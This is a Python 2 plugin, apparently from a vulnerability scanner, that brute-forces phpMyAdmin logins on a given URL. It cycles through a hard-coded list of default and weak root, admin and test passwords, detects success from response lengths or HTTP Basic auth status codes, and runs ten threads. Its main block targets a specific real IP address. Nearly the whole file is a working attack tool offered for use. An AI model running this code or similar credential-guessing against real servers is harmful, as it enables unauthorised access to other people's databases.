#!/usr/bin/env python
# -*- encoding: utf-8 -*-
import requests
import threadpool
import base64

class Plugin:
    def __init__(self, target):
        self.url = target
        self.dicts = ['root:', 'root:1', 'root:12', 'root:root', 'root:root123', 'root:root123456', 'root:123', 'root:1234',
                      'root:12345', 'root:123456', 'root:1234567', 'root:12345678', 'root:123456789', 'root:1234567890',
                      'root:654321', 'root:54321', 'root:00000000', 'root:88888888', 'root:pass', 'root:password',
                      'root:passwd', 'root:!@#$%^', 'root:1q2w3e', 'root:qawsed', 'root:pwd', 'root:test',
                      'root:qwe123',
                      'root:1qaz2ws3e4', 'root:qazwsxedc', 'root:!@#$%^&*', 'root:root123', 'root:root123456',
                      'root:rootpass', 'root:rootpassword', 'root:rootpasswd', 'root:admin', 'root:admin123', 'root:-',
                      'root:_',
                      'root:1qaz2wsx', 'root:666666', 'root:888888', 'root:123123', 'root:toor', 'root:123abc',
                      'root:passw0rd', 'admin:1', 'admin:12', 'admin:admin', 'admin:123', 'admin:1234', 'admin:12345',
                      'admin:123456',
                      'admin:1234567', 'admin:12345678', 'admin:123456789', 'admin:1234567890', 'admin:654321',
                      'admin:54321', 'admin:00000000', 'admin:88888888', 'admin:pass', 'admin:password', 'admin:passwd',
                      'admin:!@#$%^', 'admin:1q2w3e', 'admin:qawsed', 'admin:pwd', 'admin:1qaz2ws3e4',
                          'admin:qazwsxedc', 'admin:!@#$%^&*', 'admin:rootpass', 'admin:rootpassword', 'admin:rootpasswd',
                          'test:1',
                      'test:12', 'test:123', 'test:1234', 'test:12345', 'test:123456', 'test:1234567', 'test:12345678',
                      'test:123456789', 'root:xiaoyu', 'test:654321', 'test:54321']
        self.changingLength = len(requests.post(self.url,timeout=10,data={'pma_username': 'asdqexaqasdada', 'pma_password': 'asfsa1111'}).text) - len('asdqexaqasdada')
        self.staticLength1 = len(requests.post(self.url,timeout=10,data={'pma_username': 'xxxxx1aaaaxx', 'pma_password': 'asfsa1111'}).text)
        self.staticLength2 = len(requests.post(self.url,timeout=10,data={'pma_username': 'abc', 'pma_password': 'asfsa1111'}).text)
        self.emptyPwdError = len(requests.post(self.url,timeout=10,data={'pma_username': 'abcde', 'pma_password': ''}).text) - len('abcde')
        self.staticEmptyPwdError = len(requests.post(self.url,timeout=10,data={'pma_username': 'abcde', 'pma_password': ''}).text)
        self.status = requests.get(self.url,timeout=10).status_code
        self.result = ''

    def _pma_brute(self,dict):
        try:
            if self.status == 200:
                username = dict.split(':')[0]
                password = dict.split(':')[1]
                payload = {'pma_username': username, 'pma_password': password}
                result = requests.post(self.url, data=payload, timeout=10)
                if self.staticLength1 != self.staticLength2:
                    if len(result.text) - len(username) != self.changingLength and len(result.text) - len(username) != self.emptyPwdError:
                        return 2
                else:
                    if len(result.text) != self.staticLength1 and len(result.text) != self.staticEmptyPwdError:
                        return 2
            elif self.status == 401:
                header = {'Authorization':' Basic %s' % (base64.b64encode(dict))}
                if requests.get(self.url, headers=header, timeout=10).status_code == 200:
                    return 2
        except:
            pass

    def _scan_start(self, dict):
      status = self._pma_brute(dict)
      if status == 2:
        print 'pma weak pass %s' % dict
        self.result = 'pma weak pass %s' % dict

    def run(self):
        pool = threadpool.ThreadPool(10)
        reqs = threadpool.makeRequests(self._scan_start, self.dicts)
        [pool.putRequest(req) for req in reqs]
        pool.wait()
        pool.dismissWorkers(20, do_join=True)
        return self.result

if __name__ == '__main__':
    Plugin('http://210.41.240.100/phpmyadmin/index.php').run()
